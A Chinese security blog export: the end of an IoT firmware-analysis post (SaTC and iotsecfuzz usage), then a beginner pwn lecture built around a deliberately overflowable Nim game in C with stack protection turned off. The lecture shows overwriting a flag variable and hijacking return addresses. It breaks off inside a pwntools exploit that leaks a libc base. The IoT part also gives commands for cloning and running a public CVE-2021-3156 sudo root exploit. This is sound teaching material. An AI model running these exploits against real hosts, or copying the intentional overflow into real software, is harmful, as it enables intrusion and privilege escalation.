脚本。 如果使用`all`命令，`ref2sink_cmdi`、`ref2sink_bof`和`ref2share`三个脚本将同时运行 --ref2share_result /root/path/ref2share_result (可选) 运行`share2sink` Ghidra脚本时，需要使用该参数指定`ref2share`脚本的输出结果 --save_ghidra_project (可选) 是否保存程序运行时产生的ghidra工程路径 --taint_check (可选) 指定是否启用污点分析 -b /var/ac18/bin/httpd, --bin /var/ac18/bin/httpd (可选) 用于指定需要分析的程序，如果不指定，SaTC将使用内置算法确认需要分析的程序 -l 3, --len 3 (可选) 根据分析结果分析可能为边界的前N个程序，默认为3 sudo docker run -v /home/user/data:/data ... sudo docker run -v /home/iot/test/vul:/vul ... #启动Docker容器并进入其中的交互式终端 sudo docker run -it smile0304/satc:V1.0 sudo docker run -v /home/iot/test/vul:/vul smile0304/satc:V1.0 使用案例\ncd ~/SaTC/ cd ~/res/ 分析D-Link 878中命令注入、缓冲区溢出类型的漏洞 python satc.py -d /home/satc/dlink_878 -o /home/satc/res --ghidra_script=ref2sink_cmdi --ghidra_script=ref2sink_bof --taint_check python satc.py -d /home/satc/dlink_878 -o /home/satc/res --ghidra_script=ref2sink_cmdi --ghidra_script=ref2sink_bof --taint_check 分析D-Link 878中prog.cgi命令注入类型的漏洞 python satc.py -d /home/satc/dlink_878 -o /home/satc/res --ghidra_script=ref2sink_cmdi -b prog.cgi --taint_check 分析D-Link 878中rc的命令注入类型漏洞；在这个案例中prog.cgi中使用nvram_set设置变量，rc中使用nvram_get提取 python satc.py -d /home/satc/dlink_878 -o /home/satc/res --ghidra_script=ref2share -b prog.cgi python satc.py -d /home/satc/dlink_878 -o /home/satc/res --ghidra_script=share2sink --ref2share_result=/home/satc/res/ghidra_extract_result/prog.cgi/prog.cgi_ref2share.result -b rc --taint_check 输出结果的目录结构为：\n|-- ghidra_extract_result # ghidra寻找函数调用路径的分析结果, 启用`--ghidra_script`选项会输出该目录 | |-- httpd # 每个被分析的bin都会生成一个同名文件夹 | |-- httpd # 被分析的bin | |-- httpd_ref2sink_bof.result # 定位bof类型的sink函数路径 | |-- httpd_ref2sink_cmdi.result # 定位cmdi类型的sink函数路径 |-- keyword_extract_result # 关键字提取结果 | |-- detail # 前端关键字提取结果(详细分析结果) | | |-- API_detail.result # 提取的API详细结果 | | |-- API_remove_detail.result # 被过滤掉的API信息 | | |-- api_split.result # 模糊匹配的API结果 | | |-- Clustering_result_v2.result # 详细分析结果(不关心其他过程关心此文件即可) | | |-- File_detail.result # 记录了从单独文件中提取的关键字 | | |-- from_bin_add_para.result # 在二进制匹配过程中新增的关键字 | | |-- from_bin_add_para.result_v2 # 同上,V2版本 | | |-- Not_Analysise_JS_File.result # 未被分析的JS文件 | | |-- Prar_detail.result # 提取的Prar详细结果 | | |-- Prar_remove_detail.result # 被过滤掉的Prar结果 | |-- info.txt # 记录前端关键字提取时间等信息 | |-- simple # 前端关键字提取结果, 比较简单 | |-- API_simple.result # 在全部二进制中出现的全部API名称 | |-- Prar_simple.result # 在全部二进制中出现等的全部Prar |-- result-httpd-ref2sink_cmdi-ctW8.txt # 污点分析结果,启用`--taint-check` 和 `--ghidra_script`选项才会生成该文件 在/home/satc/res下生成的txt文件可以查看结果\niotseccfuzz # securestep9/iotsecfuzz: fork of https://gitlab.com/invuls/iot-projects/iotsecfuzz (github.com)\n安装：\npip3 install --upgrade setuptools git clone https://gitlab.com/invuls/iot-projects/iotsecfuzz.git cd iotsecfuzz python3 setup.py install # API from isf import core core.init_home_directory() # You can edit directories to load modules from core.modules_dirs.append(\u0026#39;.\u0026#39;) core.load_modules() # Way 1: import the module directly from isf.hardware.ttltalker import TTLTalker talker = TTLTalker(\u0026#39;/dev/ttyACM0\u0026#39;, 9600, 0.1) talker.connect() talker.send_char(\u0026#39;ff\u0026#39;, False, 0) # Way 2: get module/submodule using ISF core send_char = core.modules[\u0026#39;hardware/ttltalker/send_char\u0026#39;] send_char.run({\u0026#39;com_port\u0026#39;: \u0026#39;/dev/ttyACM0\u0026#39;, \u0026#39;baudrate\u0026#39;: 9600, \u0026#39;timeout\u0026#39;: 0.1, \u0026#39;char_hex\u0026#39;: \u0026#39;ff\u0026#39;, \u0026#39;output\u0026#39;: False, \u0026#39;output_length\u0026#39;: 0}) 其他相关工具 # Binwalk misc常用 Firmwalker attify自带 Angr 逆向会用 gdb pwn常用 Radare2 pwn会用 Binary Analysis Tool（BAT） attify自带 IDA Pro pwn常用 afl afl++等 fuzz 工具 pwn常用 其他二进制静态辅助工具 BinAbsInspector Rhabdomancer Haruspex + semgrep 注：刚开始入门 IoT 时可以使用 AttifyOS v3.0或者 Attify0S v4.0\n且 attifyOS 我们可以使用各类提权漏洞来切换至root用户\n# example1 $ sudo env /bin/bash # 即可提权为root用户 $ passwd root # 修改root用户的密码 # example2 找一些cve来打 $ git clone https://github.com/blasty/CVE-2021-3156.git $ cd CVE-2021-3156 $ make $ chmod a+x sudo-hax-me-a-sandwich $ chmod +x sudo-hax-me-a-sandwich $ ./sudo-hax-me-a-sandwich 0 $ passwd root # ... 参考链接 # 仿真分析 - IOT 固件安全 All in One (gitbook.io)\n前言 · 物联网安全百科 (iot-security.wiki)\n如何快速挖掘设备逻辑洞 - IOTsec-Zone\n浅析IOT二进制静态辅助方法 - FreeBuf网络安全行业门户\nQiling Fuzz实例分析 - IOTsec-Zone\nAFL 源码分析系列（五）- afl-fuzz(2) - IOTsec-Zone\nFuzzing101全实践 \u0026ndash; （三） - IOTsec-Zone\n0xricksanchez (434b) (github.com)\nRuan Xingzhi - Pion1eer\nAFL源码阅读（一）：启程 (ruanx.net)\n和菜鸟一起学linux之upnp协议的学习记录 - 吴一达 - 博客园 (cnblogs.com)\n蓝牙最详细的基础知识整理 - 知乎 (zhihu.com)\nBLE 协议系列之（一） 蓝牙介绍_蓝牙是什么通信协议-CSDN博客\n物联网无线短距离ZigBee技术详解-腾讯云开发者社区-腾讯云 (tencent.com)\n","date":"February 21, 2024","permalink":"/posts/iot/0x01/","section":"Posts","summary":"如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 固件","title":"IoT基础学习"},{"content":"写给学弟学妹的pwn入门宣讲~\n0x00 前言 # 想了解pwn的同学可以看看： pwn入门教程 · ta0lve CTF经验贴｜我们对PWN都有哪些误会 (qq.com) 栈介绍 - CTF Wiki (ctf-wiki.org) 0x01 宣讲PWN详情 # PWN方向是5个方向中最后宣讲的方向，预计在周六晚（2023/9/23）9点半左右开始，也可能提前一些\n希望大家都能听到最后（鞠躬）\n很抱歉原计划2023/9/23晚的宣讲因不可抗力延迟至下周六9月30日，在此我们深刻检讨，并向大家诚恳道歉。为表补偿，下周宣讲将额外有newstar CTF第一周题目的讲解和答疑，再次对大家表示抱歉，欢迎下周来听宣讲\n本周宣讲中pwn方向的内容也将以讲义/博客文章的方式发送给大家，大家可以阅读学习，有任何问题可以先在搜索引擎上试着搜素一下，实在无法解决的话也可以在群里询问我 or 私聊我，我将在自己的能力范围内为大家尽可能的提供帮助\n最后，再次表达我们的歉意，预祝大家下周一的 NewStarCTF 比赛顺利，旗开得胜！\n0x02 在宣讲前同学们可以做的一些准备 # 1.安装dev-c++ # 因为宣讲时可能需要让大家一起动手操作，一起运行代码+调试，所以建议大家都使用同一个软件\n当然，使用mac的xcode的同学和使用linux的同学可以不用装 至于为什么使用dev-c++呢，理由有三\n听说大一的同学们用dev-c++比较多（道听途说） dev-c++没有VS及其他IDE自带的安全检测，比较容易执行我们的代码 其他IDE可能会执行不了 我们后面会用到dev-c++程序自带的gdb工具（见下一条） 当然，也可以直接在windows上装一个，如果在linux上装一个就更好了（） 在Windows下安装编译GDB调试工具_gdb windows_ZeroZone零域的博客-CSDN博客 2.在windows下体验gdb # 用mac的同学可以参考;\n在Mac安装最新gdb的详细教程，含可能遇到的所有坑(网上最新教程)\n浅浅地体验一下gdb与命令行\n（手把手配置windows环境变量），会配的同学就可以直接跳过啦 右键devcpp快捷方式，选择打开文件所在位置 或者采用其他方式，找到安装的目录即可 找到MinGW64目录并双击进入，在找到bin目录再次进入，可以看到一个gdb.exe 复制上方的路径（ctrl+c） 待会要用到（） 配置环境变量，直接左下角搜索环境变量 （或者找到高级系统设置）然后点击弹窗中的环境变量 在用户变量中（系统变量也行）找到一个变量名为Path的环境变量，点击编辑 点击新建，将刚才复制的路径粘贴进去并点击确定保存 之后一直点击确认退出，在右下角的搜索框内输入cmd并回车打开windows命令行工具（powershell也OK） 在命令行上面输入命令gdb，回车看看是不是成功设置好了环境变量 注：有些旧版本Windows设置完环境变量要重启才能生效 如何使用可以先在网上搜索一些教程~ 今晚宣讲的时候也会教大家用一些基本的命令 直接看下面的0x07部分（鞠躬） 3.提前阅读、运行今天晚上的源码 # （在qq群里面也发了源码）\n0x03 编译运行程序 # 源代码如下：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // disable stack protector // you can also add -fno-stack-protector when compiling // why we need to do this? what is stack protector? #if defined(__clang__) #define DISABLE_STACK_PROTECTOR __attribute__ ((no_stack_protector)) #elif defined(__GNUC__) || defined(__GNUG__) #define DISABLE_STACK_PROTECTOR __attribute__((__optimize__(\u0026#34;-fno-stack-protector\u0026#34;))) #elif defined(_MSC_VER) #define DISABLE_STACK_PROTECTOR __attribute__ ((no_stack_protector)) #endif int player_select(int tokens_cnt, int take); int computer_select(int tokens_cnt); void success(); int DISABLE_STACK_PROTECTOR main() { setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stdout, NULL); printf(\u0026#34;W4terCTF Nim Game level 3\\n\u0026#34;); printf(\u0026#34;You carry the future of humanity. A powerful AI invites you to play nimgame.\\n\u0026#34;); printf(\u0026#34;Once you lose, it will dominate the world!\\n\u0026#34;); printf(\u0026#34;How to play: There are 16 tokens on the table. Each player can take 1, 2, or 3 tokens at a time. The player who takes the last token wins.\\n\\n\u0026#34;); struct { char input[16]; char win_flag; int tokens_cnt; } Game; Game.win_flag = 0; Game.tokens_cnt = 16; // printf(\u0026#34;address of input: %p, address of win_flag: %p\\n\u0026#34;, Game.input, \u0026amp;Game.win_flag); printf(\u0026#34;There are %i tokens on the table.\\n\u0026#34;, Game.tokens_cnt); while (Game.tokens_cnt \u0026gt; 0) { printf(\u0026#34;How many tokens would you like to take?: \u0026#34;); read(0, Game.input, 0x100); printf(\u0026#34;\\nPlayer takes %s tokens.\\n\u0026#34;, Game.input); Game.input[8] = 0; int token = atoi(Game.input); int next_tokens_cnt = player_select(Game.tokens_cnt, token); if(next_tokens_cnt == Game.tokens_cnt) { continue; } Game.tokens_cnt = next_tokens_cnt; if (Game.tokens_cnt == 0) { Game.win_flag = \u0026#39;W\u0026#39;; } else printf(\u0026#34;continue\\n\u0026#34;); if(Game.win_flag == \u0026#39;W\u0026#39;) { printf(\u0026#34;Player wins.\\n\u0026#34;); success(); break; } Game.tokens_cnt = computer_select(Game.tokens_cnt); if(Game.tokens_cnt == 0) { printf(\u0026#34;Computer wins.\\n\u0026#34;); break; } } return 0; } void success() { printf(\u0026#34;Congratulations! You beat this power AI\\nBut... AI still rules the world...\\n\u0026#34;); } void saving_grace() { printf(\u0026#34;You really save the world\\n\u0026#34;); } int player_select(int tokens_cnt, int take) { if(take \u0026lt; 1 || take \u0026gt; 3) { printf(\u0026#34;Number of tokens must be between 1 and 3.\\n\\n\u0026#34;); return tokens_cnt; } int remaining_tokens_cnt = tokens_cnt - take; printf(\u0026#34;%i tokens remaining.\\n\\n\u0026#34;, remaining_tokens_cnt); return remaining_tokens_cnt; } int computer_select(int tokens_cnt) { int take = tokens_cnt % 4; if(take == 4) { take = 1; } int remaining_tokens_cnt = tokens_cnt - take; printf(\u0026#34;\\nComputer takes %i tokens.\\n\u0026#34;, take); printf(\u0026#34;%i tokens remaining.\\n\\n\u0026#34;, remaining_tokens_cnt); return remaining_tokens_cnt; } 请大家编译这个程序，😈AI打算跟你玩一场尼姆游戏\n有发现什么问题吗\n你的编译器可能会不乐意编译这个程序，需要关闭一些安全措施\nVisual Studio等高级IDE会有安全检查\n使用 scanf 时编译器提示我们这个函数是不安全的，提示我们使用 scanf_s 来替代\n我们可以使用宏定义来关闭安全检查\n#define _CRT_SECURE_NO_WARNINGS 1 但是在vs2019及vs2022中已经没有gets()函数\n所以建议先使用dev-c++来编译程序，之后可以考虑使用gcc来编译 clang/gcc应该可以编译，但是会出现warning\nMac用户使用xcode应该可以编译\n0x04 源码分析 # 这些代码实现了一个简单的Nim游戏\nNim游戏是一个两人博弈游戏， 玩家轮流从一堆牌中取走任意数量的牌， 最后拿到最后一张牌的玩家获胜 在这个代码中，游戏有16张牌\n玩家和计算机轮流拿走牌，每次可以取1、2或3张。 当没有剩余牌时，游戏结束 可以开始挑战了，是否有方法胜利呢？\n自己尝试一下吧！\nsleep(30); // 等待30s （下面的逐行分析宣讲时可能会只挑一些来讲，程序的具体实现其实并不需要在意，觉得讲的慢的同学可以提前看看扩展阅读部分，感觉有些跟不上的同学可以先跟上节奏等宣讲完之后回来看逐行分析慢慢搞懂）\n（因为大家的C语言基础不同，所以会讲的稍微详细一些，在部分讲解可能会有一两篇扩展阅读，感兴趣、有时间的同学可以有选择的看一看、学一学）\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; 引入头文件： 这些头文件提供了一些常用的函数和类型定义，比如输入输出函数、随机数函数等 #if defined(__clang__) #define DISABLE_STACK_PROTECTOR __attribute__ ((no_stack_protector)) #elif defined(__GNUC__) || defined(__GNUG__) #define DISABLE_STACK_PROTECTOR __attribute__((__optimize__(\u0026#34;-fno-stack-protector\u0026#34;))) #elif defined(_MSC_VER) #define DISABLE_STACK_PROTECTOR __attribute__ ((no_stack_protector)) #endif 使用了DISABLE_STACK_PROTECTOR宏来禁用栈保护机制\n栈保护机制是一种防止缓冲区溢出攻击的安全措施，通过在栈上存储额外的校验值来检测溢出情况。 这段代码使用了条件编译，根据不同的编译器来定义DISABLE_STACK_PROTECTOR宏。\n具体而言：\n如果使用的是Clang编译器，那么DISABLE_STACK_PROTECTOR被定义为__attribute__((no_stack_protector))，表示禁用栈保护机制。 如果使用的是GCC或者GNU编译器，那么DISABLE_STACK_PROTECTOR被定义为__attribute__((optimize(\u0026quot;-fno-stack-protector\u0026quot;)))，同样表示禁用栈保护机制。 如果使用的是MSVC编译器，那么DISABLE_STACK_PROTECTOR被定义为__attribute__((no_stack_protector))，同样表示禁用栈保护机制。 *扩展阅读\n// disable stack protector // you can also add -fno-stack-protector when compiling // why we need to do this? what is stack protector? Linux 常用保护机制 | Lantern\u0026rsquo;s 小站\nLinux保护机制和绕过方式 - 一点涵 - 博客园 (cnblogs.com)\nint player_select(int tokens_cnt, int take); int computer_select(int tokens_cnt); void success(); 这些是函数的原型声明，声明了三个函数 player_select、computer_select和success int DISABLE_STACK_PROTECTOR main() { // ... } 这是程序的主函数 main，也是整个程序的入口点 really ? *扩展阅读: 主函数main和程序入口_start__start函数_Freestyle Coding的博客-CSDN博客 Linux x86 Program Start Up (dbp-consulting.com) [Linux x86 Program Start Up or- 翻译][注解版] - 知乎 (zhihu.com) 前面的DISABLE_STACK_PROTECTOR是上面定义的宏，用于禁用栈保护 setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stdout, NULL); 这些函数调用用于设置标准输入输出的缓冲方式为无缓冲 即每次进行输入输出都会立即生效，而不会等待缓冲区满或换行符 *扩展阅读: I\\O操作之setbuf、setvbuf_ll2323001的博客-CSDN博客 printf(\u0026#34;W4terCTF Nim Game level 3\\n\u0026#34;); printf(\u0026#34;You carry the future of humanity. A powerful AI invites you to play nimgame.\\n\u0026#34;); printf(\u0026#34;Once you lose, it will dominate the world!\\n\u0026#34;); printf(\u0026#34;How to play: There are 16 tokens on the table. Each player can take 1, 2, or 3 tokens at a time. The player who takes the last token wins.\\n\\n\u0026#34;); 输出游戏的相关信息，向玩家解释游戏规则\n可以想想：\n怎样才能获得胜利？\ncomputer后手是不是一定能够获胜呢？\n逻辑设计漏洞与程序实现漏洞\nsleep(60); // 等待60s 注：改编自W4terCTF2023的一道pwn题\nhttps://github.com/W4terDr0p/W4terCTF-2023 struct { char input[16]; char win_flag; int tokens_cnt; } Game; Game.win_flag = 0; Game.tokens_cnt = 16; 这里定义了一个结构体 Game，包含三个成员变量\n一个长度为16的字符数组 input\n即大小只有16（0x10）\n*扩展-进制 英文 范围 前缀 后缀 二进制 Binary 0-1 0B B 八进制 Octal 0-7 0O O 十进制 Decimal 0-9 无 D 十六进制 Hexadecimal 0-9, A-F 0x H 一个字符型变量 win_flag\n一个整型变量 tokens_cnt\n这个结构体用于保存游戏的状态信息\n后面两行代码初始化了结构体 Game 的 win_flag 和 tokens_cnt 成员变量的值\n其实使用局部变量也是一样的（）\n// printf(\u0026#34;address of input: %p, address of win_flag: %p\\n\u0026#34;, Game.input, \u0026amp;Game.win_flag); 被注释了所以程序不会运行这个语句 这行代码可以输出结构体 Game 的 input 成员变量的地址和 win_flag 成员变量的地址 printf(\u0026#34;There are %i tokens on the table.\\n\u0026#34;, Game.tokens_cnt); // 输出当前剩余的tokens数量 while (Game.tokens_cnt \u0026gt; 0) { // while循环语句的开始,剩余的数量大于0时循环 printf(\u0026#34;How many tokens would you like to take?: \u0026#34;); read(0, Game.input, 0x100); // ssize_t read(int fd, void *buf, size_t count); (搜素引擎) // 通过 read 函数从输入中读取玩家输入的内容存储到 Game.input 变量中 // 可读取0x100大小的内容 printf(\u0026#34;\\nPlayer takes %s tokens.\\n\u0026#34;, Game.input); Game.input[8] = 0; int token = atoi(Game.input); // 使用 atoi 函数将输入的字符串转换为整数类型 // ASCII to integer int next_tokens_cnt = player_select(Game.tokens_cnt, token); // 调用函数 player_select，根据玩家选择的令牌数量更新剩余的令牌数量 if(next_tokens_cnt == Game.tokens_cnt) { continue; } // 如果函数 player_select 返回的剩余令牌数量与之前的数量相等， // 说明玩家的选择是非法的，使用 continue 跳过后续的代码，回到循环的开头 Game.tokens_cnt = next_tokens_cnt; if (Game.tokens_cnt == 0) { Game.win_flag = \u0026#39;W\u0026#39;; } else printf(\u0026#34;continue\\n\u0026#34;); // 如果剩余令牌数量为0，说明玩家取走了最后一个令牌， // 将 win_flag 设置为字符 \u0026#39;W\u0026#39;代表玩家胜利，否则输出 \u0026#34;continue\u0026#34;。 if(Game.win_flag == \u0026#39;W\u0026#39;) { printf(\u0026#34;Player wins.\\n\u0026#34;); success(); break; } // 如果 win_flag 的值为 \u0026#39;W\u0026#39;，说明玩家取走了最后一个令牌，玩家获胜。 // 调用函数 success() 并跳出循环 Game.tokens_cnt = computer_select(Game.tokens_cnt); if(Game.tokens_cnt == 0) { printf(\u0026#34;Computer wins.\\n\u0026#34;); break; } // 计算机根据当前剩余令牌数量选择要取走的令牌数量，并更新剩余令牌数量 // 如果剩余令牌数量为0，说明计算机取走了最后一个令牌，计算机获胜。 // 输出 \u0026#34;Computer wins.\u0026#34;并跳出循环 } // while循环语句的结束 有一个漏洞，你发现了吗？ 数组溢出 有了这个漏洞我们可以干一些什么？ 使得我们输入的数据覆盖其他的一些地址，可能会改变一些变量的值 *扩展阅读: 栈介绍 - CTF Wiki (ctf-wiki.org) 栈溢出原理 - CTF Wiki (ctf-wiki.org) void success() { printf(\u0026#34;Congratulations! You beat this power AI\\nBut... AI still rules the world...\\n\u0026#34;); } 这是函数 success() 的定义，用于输出玩家获胜的消息 但是好像赢了又没完全赢 如赢（） 难道这个漏洞还可以干一些其他事吗？ void saving_grace() { printf(\u0026#34;You really save the world\\n\u0026#34;); } 这是函数 saving_grace() 的定义，用于输出玩家拯救世界的消息 原来这才是真正的获胜 int player_select(int tokens_cnt, int take) { if(take \u0026lt; 1 || take \u0026gt; 3) { printf(\u0026#34;Number of tokens must be between 1 and 3.\\n\\n\u0026#34;); return tokens_cnt; } int remaining_tokens_cnt = tokens_cnt - take; printf(\u0026#34;%i tokens remaining.\\n\\n\u0026#34;, remaining_tokens_cnt); return remaining_tokens_cnt; } 这是函数 player_select() 的定义，根据玩家选择的令牌数量更新剩余令牌数量，并返回更新后的值 如果玩家选择的数量不符合要求（不在1到3之间），则输出错误信息并返回原来的剩余令牌数量 int computer_select(int tokens_cnt) { int take = tokens_cnt % 4; if(take == 4) { take = 1; } int remaining_tokens_cnt = tokens_cnt - take; printf(\u0026#34;\\nComputer takes %i tokens.\\n\u0026#34;, take); printf(\u0026#34;%i tokens remaining.\\n\\n\u0026#34;, remaining_tokens_cnt); return remaining_tokens_cnt; } 这是函数 computer_select() 的定义，根据当前剩余的令牌数量，计算计算机选择要取走的令牌数量，并更新剩余令牌数量 计算机的选择是根据剩余令牌数量对4取模得到的结果，并确保选择的值不为4 保证计算机在理论上是必赢的 0x05 漏洞利用与调试-level1 # 还记得我们的漏洞吗？\nstruct { char input[16]; char win_flag; int tokens_cnt; } Game; read(0, Game.input, 0x100); 程序的胜利条件\nif(Game.win_flag == \u0026#39;W\u0026#39;) { printf(\u0026#34;Player wins.\\n\u0026#34;); success(); break; } 我们可不可以利用这个溢出漏洞来取得游戏的胜利呢？\nsleep(30); // 等待30s 溢出漏洞使得我们输入的数据覆盖其他的一些地址，可能会改变一些变量的值\n利用printf函数打印出两个变量的地址\n*扩展阅读:\nC语言中连续定义两个变量，为什么地址是这样的？ - 知乎 (zhihu.com) 现在请大家取消第41行的注释\n再次运行程序，观察程序的输出 思考一下现在如何获取胜利？ 输入 aaaaaaaaaaaaaaa（15个\u0026rsquo;a\u0026rsquo;加一个换行符），使用调试器观察程序，用任何你喜欢的工具都可以\n注意上一页两个指针的输出，有没有方法直接修改掉win_flag 从输出的指针上面我们可以知道input的地址与win_flag的地址距离为16（即0x10）\n所以当我们输入16个\u0026rsquo;a\u0026rsquo;之后就可以讲数据覆盖到win_flag的地址上 就相当于我们将win_flag的值进行了更改 （即恶意篡改变量的值） 输入 aaaaaaaaaaaaaaaW（15个\u0026rsquo;a\u0026rsquo;加一个\u0026rsquo;W\u0026rsquo;加一个换行符）\n查看win_flag的值 可以看到win_flag的值已经成功的被我们改成了\u0026rsquo;W' 这意味着当程序执行到第65行时就会输出我们胜利的代码 输入 aaaaaaaaaaaaaaaW 之后我们再随便输入一个1~3之间的数字就可以结束游戏啦\n0x06 漏洞利用与调试-level2 # 查看success函数的输出，我们发现，简单地将win_flag覆盖成\u0026rsquo;W\u0026rsquo;好像并不是真正的胜利\nvoid success() { printf(\u0026#34;Congratulations! You beat this power AI\\nBut... AI still rules the world...\\n\u0026#34;); } 嘿！注意到程序中还有另一个函数吗？你能让程序执行它吗？（void saving_grace(); ）\n只有让程序运行到saving_grace函数才是真正的胜利\nvoid saving_grace() { printf(\u0026#34;You really save the world\\n\u0026#34;); } 要怎样运行到这个函数呢？\n请考虑几个问题：\n函数调用的时候发生了什么，程序如何跳转到一个新的函数？\n函数返回的时候发生了什么，程序如何知道自己返回到什么地方？\n为什么你的老师会说不要返回一个局部变量的指针呢\nsleep(60); // 等待60s 函数调用的基本原理 # 函数的调用一般都是用函数调用栈来实现的\n基本栈介绍（copy from ctf-wiki）\n栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示 两种操作都操作栈顶，当然，它也有栈底。 对于一个函数function0与function1，已知finction0调用了一次function1\nfunction0内部的变量保存在栈上 当他调用function1时，便将下一条要执行的语句的地址压入栈中 下一条要执行的语句的地址为0x10000010 当function1执行完所有语句返回时，函数调用栈就将最上面的返回地址出栈，使得函数执行回0x10000010语句 具体如何实现语句执行操作的可以自行利用搜素引擎解决疑惑，不过可能涉及寄存器等相关知识 目前不全部搞懂也是OK的 思考一下\n如果栈上面的这个返回地址的值能被我们覆盖，那么是否可以控制程序的执行流呢\nsleep(60); // 等待60s 比如，我们将返回地址的值从0x10000010覆盖成0x10000020\n那么程序的执行是不是就会跳过0x10000010语句和0x100000018语句直接执行0x10000020语句呢？\n注：函数调用的基本原理原本是打算用PPT上的动画来讲的，现在在文章上讲的话可能讲得不如其他一些师傅详细，如果还是不太懂的话大家也可以读一读下面的这些文章：\n函数调用的基本原理\nC语言函数调用栈(一) - clover_toeic - 博客园 (cnblogs.com)\nC语言函数调用栈(二) - clover_toeic - 博客园 (cnblogs.com)\n课后思考： # 你现在应该已经有了一些想法了，接下来你可能会需要\n怎么知道目标函数的地址呢？ 你大可直接在程序中多加一行输出，但面对真实世界中的漏洞利用，这是几乎不可能的。 你可能会需要一个反汇编器，例如：IDA，Ghidra，Hopper，Radare 2，甚至使用你的调试器，也可以打印出目标函数的地址 目标函数地址中，并不是每一个字节都可以用你的键盘打出来 你需要一个与程序交互的工具，比如pwntools 接下来你可能会发现，你实际上还是没有办法跳转到目标函数，它的地址一直在变化！怎么办呢？ 试着通过搜索引擎解答疑惑or在群里寻求帮助吧 也可以阅读下面的这篇文章： PIE保护详解和常用bypass手段-安全客 - 安全资讯平台 (anquanke.com) 最后，你可能会发现：\n即使你跳转到了这个函数也无济于事，有没有什么方法能够完全掌控这个程序呢 除了执行程序里留下的这个函数，我们还能做什么呢？如果给你一台运行了这个程序的服务器，你是否能够攻入其中呢？ 注：原计划此处会有一个真实远程pwn机的演示，看看什么时候还有机会演示一下吧，getshell的exp就放在附录中啦，感兴趣的同学们可以去看一看\n0x07 初探 gdb（自行阅读） # gdb是什么\nGDB，全称 GNU symbolic debugger，简称 GDB调试器，是 Linux 平台下最常用的一款程序调试器 gdb常用命令学习 # 命令名称 命令缩写 命令说明 run r 运行一个待调试的程序 continue c 让暂停的程序继续运行 next n 运行到下一行 step s 单步执行，遇到函数会进入 until u 运行到指定行停下来 finish fi 结束当前调用函数，回到上一层调用函数处 return return 结束当前调用函数并返回指定值，到上一层函数调用处 jump j 将当前程序执行流跳转到指定行或地址 print p 打印变量或寄存器值 backtrace bt 查看当前线程的调用堆栈 frame f 切换到当前调用线程的指定堆栈 thread thread 切换到指定线程 break b 添加断点 tbreak tb 添加临时断点 delete d 删除断点 enable enable 启用某个断点 disable disable 禁用某个断点 watch watch 监视某一个变量或内存地址的值是否发生变化 list l 显示源码 info i 查看断点 / 线程等信息 ptype ptype 查看变量类型 disassemble dis 查看汇编代码 set args set args 设置程序启动命令行参数 show args show args 查看设置的命令行参数 next 和 step 都是单步执行，但有一些差别：\nnext 是 单步步过（step over），即遇到函数直接跳过，不进入函数内部\nstep 是 单步步入（step into），即遇到函数会进入函数内部\nreturn 和 finish 都是退出函数，但有一些差别：\nreturn 命令是立即退出当前函数，剩下的代码不会执行了，return 还可以指定函数的返回值 finish 命令是会继续执行完该函数剩余代码再正常退出 disassemble命令\n查看某段代码的汇编指令，pwn常用 x 命令 # 查看内存地址中的值，pwn非常常用\n格式：x/\u0026lt;n/f/u\u0026gt; \u0026lt;addr\u0026gt;\nn\n第一个参数n是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义 f\n第二个参数f表示addr指向的内存内容的输出格式 x 按十六进制格式显示变量 d 按十进制格式显示变量 u 按十六进制格式显示无符号整型 o 按八进制格式显示变量 t 按二进制格式显示变量 a 按十六进制格式显示变量 c 按字符格式显示变量 f 按浮点数格式显示变量 s对应输出字符串，此处需特别注意输出整型数据的格式 u\n第三个参数u定义一个内存单元的大小，即以多少个字节作为一个内存单元 默认为4 还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes \u0026lt;addr\u0026gt;\n表示要查看的内存地址 整个命令的诠释：\n以addr为起始地址，返回n个单元的值，每个单元对应u个字节，输出格式是f 如：x/ 3uh 0x54320表示：以地址0x54320为起始地址，返回3个单元的值，每个单元有两个字节，输出格式为无符号十六进制\n也就是说返回了3*2=6个字节的数据，以十六进制输出，这6个字节的数据，每两个字节为一个单元输出，共输出3个单元\n0x08 在NewStarCTF比赛前我们可以做的一些准备： # 自己动手安装一个linux虚拟机 在VMware16虚拟机安装Ubuntu详细教程_vmware16安装ubuntu_wings(hha)的博客-CSDN博客 学习linux的一些命令 Linux命令入门与总结 · ta0lve 可以开始配一些PWN的环境 PWN环境二次搭建记录-Ubuntu 22.04 · ta0lve 不用太多，装一个gdb插件和pwntools库就差不多啦 后面有需要的时候再自己安装其他工具 安装一个反编译神器IDA IDA Free (hex-rays.com) 或者也可以自己找网上的一些资源来安装 跟着ctf-wiki学习一下pwn的相关知识 栈介绍 - CTF Wiki (ctf-wiki.org) 尝试做一两道pwn的入门题 今年春季的W4terCTF https://github.com/W4terDr0p/W4terCTF-2023 NSSCTF平台上面的简单题 https://www.nssctf.cn/problem 找一些往年招新赛的题目来做就OK啦 buuctf平台的前几题 https://buuoj.cn/challenges 注：网站现在在迁移维护中\u0026hellip; 附录 # exp # 该exp假定大家已经能够熟练使用pwntools库及ROPgadget工具，且程序的编译环境为linux系统\n还不了解的同学可以阅读以下文章后再回来看\n基本 ROP - CTF Wiki (ctf-wiki.org)\nfrom pwn import * sh = remote(\u0026#39;ip地址\u0026#39;, 端口号) # sh = process(\u0026#39;./nimgame\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; sh.recvuntil(b\u0026#39;take?: \u0026#39;) sh.sendline(b\u0026#39;A\u0026#39;*39) sh.recvuntil(b\u0026#39;takes \u0026#39;) sh.recvuntil(b\u0026#39;\\n\u0026#39;) libcbase = u64(sh.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;))-0x29d90 log.success(\u0026#34;libcbase: \u0026#34;+hex(libcbase)) # 